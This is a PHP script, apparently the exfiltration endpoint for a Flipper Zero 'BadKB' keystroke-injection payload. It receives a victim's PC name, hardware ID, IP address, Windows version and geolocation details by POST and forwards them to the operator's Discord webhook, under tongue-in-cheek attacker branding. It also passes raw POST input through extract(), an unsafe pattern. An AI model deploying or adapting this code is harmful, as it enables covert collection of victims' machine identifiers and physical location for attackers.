<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $webhookurl = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your Discord webhook URL
    // Extract all the POST variables
    extract($_POST);

    // Prepare the data for Discord
    $json_data = json_encode([
        "content" => null,
        "embeds" => [
            [
                "title" => "Result",
                "description" => "Ran On :  ``$date``\nResult :  ``Success``\nLocation :  ``$city``\nFlipper Name : ``FlipperZero``",
                "color" => 16392194,
                "fields" => [
                    [
                        "name" => "Script Pull",
                        "value" => "User's Pc Name : ``$pcname``\nHardware ID (HWID) : ``$hwid``\nIp-Address : ``$ip``\nPC Version : ``$winver``"
                    ],
                    [
                        "name" => "IP-Info",
                        "value" => "Ip-Address :``$ip``\nHostname:``$hostname``\nCity: ``$city``\nRegion: ``$region``\nCo-ordinates: ``$loc``\nISP: ``$org``\nPostal Code: ``$postal``\nTimezone: ``$timezone``"
                    ]
                ],
                "author" => [
                    "name" => "Wolfie - BadKB Sc1 Script",
                    "icon_url" => "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSA-WlI_lk-qJZCMhb-2I72XA7ni75rO0sRmpnN-m8QbsHHTv9eSfp9ujm4zxB4xVk13gI&usqp=CAU" //Change to your liking
                ],
                "footer" => [
                    "text" => "Wolfie Out - Hehe",
                    "icon_url" => "https://media.tenor.com/IfIPKfmQx7sAAAAC/wolf-of-wall-street.gif" //Change to your liking
                ],
                "image" => [
                    "url" => "https://media3.giphy.com/media/rY93u9tQbybks/giphy.gif" //Change to your liking
                ],
                "thumbnail" => [
                    "url" => "https://www.icegif.com/wp-content/uploads/2022/08/icegif-147.gif" //Change to your liking
                ]
            ]
        ],
        "username" => "Flippie Wolfie", //Change Your Webhook Name
        "avatar_url" => "https://pbs.twimg.com/media/FxtVHN0WIAI4JV3.jpg",  //Change to your liking
        "attachments" => []
    ]);

    // Use cURL to send the data to the Discord webhook
    $ch = curl_init($webhookurl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $response = curl_exec($ch);
    // Check for errors
    if(curl_errno($ch)){
        echo 'Request Error:' . curl_error($ch);
    }
    curl_close($ch);
}
?>